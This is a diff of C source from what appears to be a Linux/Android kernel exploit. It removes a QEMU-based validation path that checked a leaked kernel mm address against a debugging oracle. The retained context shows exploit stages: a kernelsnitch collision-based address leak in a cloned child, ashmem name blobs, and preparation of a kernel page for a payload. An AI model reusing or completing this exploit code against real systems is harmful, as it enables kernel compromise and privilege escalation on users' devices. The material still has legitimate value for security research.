@@ -789,7 +789,7 @@ int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
   return 0;
 }
 
-#if defined(QEMU_MM_TRACE_ORACLE) || defined(QEMU_MM_TRACE_VALIDATE)
+#if defined(QEMU_MM_TRACE_ORACLE)
 static int qemu_mm_trace_fd = -1;
 
 static int qemu_mm_trace_ready(void) {
@@ -887,25 +887,6 @@ static int qemu_mm_trace_read(uintptr_t *mm_out) {
 }
 #endif
 
-#if defined(QEMU_MM_TRACE_VALIDATE) && QEMU_MM_TRACE_VALIDATE
-static uintptr_t qemu_mm_oracle_mm;
-static int qemu_mm_oracle_valid;
-
-static void qemu_mm_oracle_reset(void) {
-  qemu_mm_oracle_mm = 0;
-  qemu_mm_oracle_valid = 0;
-}
-
-static void qemu_mm_oracle_capture(void) {
-  uintptr_t oracle_mm = 0;
-  qemu_mm_oracle_valid = qemu_mm_trace_read(&oracle_mm);
-  if (qemu_mm_oracle_valid) {
-    qemu_mm_oracle_mm = oracle_mm;
-    pr_info("qemu mm validate captured mm=%016zx pid=%d\n",
-            oracle_mm, getpid());
-  }
-}
-#endif
 
 pid_t clone_child(void) {
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
@@ -949,12 +930,6 @@ int qemu_mm_oracle_leak(uintptr_t *mm_out, int *memfd_out) {
 #endif
 
 pid_t clone_leak_child(void) {
-#if defined(QEMU_MM_TRACE_VALIDATE) && QEMU_MM_TRACE_VALIDATE
-  qemu_mm_oracle_reset();
-  if (!qemu_mm_trace_drain()) {
-    pr_warning("qemu mm validate drain failed before clone\n");
-  }
-#endif
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
     SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
@@ -964,9 +939,6 @@ pid_t clone_leak_child(void) {
     kernelsnitch_find_collisions(ks);
     exit(0);
   }
-#if defined(QEMU_MM_TRACE_VALIDATE) && QEMU_MM_TRACE_VALIDATE
-  qemu_mm_oracle_capture();
-#endif
   return child;
 }
 
@@ -2295,31 +2267,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   log_mm_slabinfo("after-leak");
 #endif
 
-#if defined(QEMU_MM_TRACE_VALIDATE) && QEMU_MM_TRACE_VALIDATE
-  if (!qemu_mm_oracle_valid) {
-    pr_warning("qemu mm validate missing oracle for leaked=%016zx\n", leaked);
-    cleanup_mm_search_state();
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
-    }
-    cleanup_page_prepare_state();
-    return 0;
-  }
-  pr_info("qemu mm validate ks=%016zx actual=%016zx exact=%d page=%d\n",
-          leaked, qemu_mm_oracle_mm, leaked == qemu_mm_oracle_mm,
-          (leaked & ~(ORDER3_SIZE - 1)) ==
-              (qemu_mm_oracle_mm & ~(ORDER3_SIZE - 1)));
-  if (leaked != qemu_mm_oracle_mm) {
-    pr_warning("qemu mm validate mismatch ks=%016zx actual=%016zx\n",
-               leaked, qemu_mm_oracle_mm);
-    cleanup_mm_search_state();
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
-    }
-    cleanup_page_prepare_state();
-    return 0;
-  }
-#endif
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
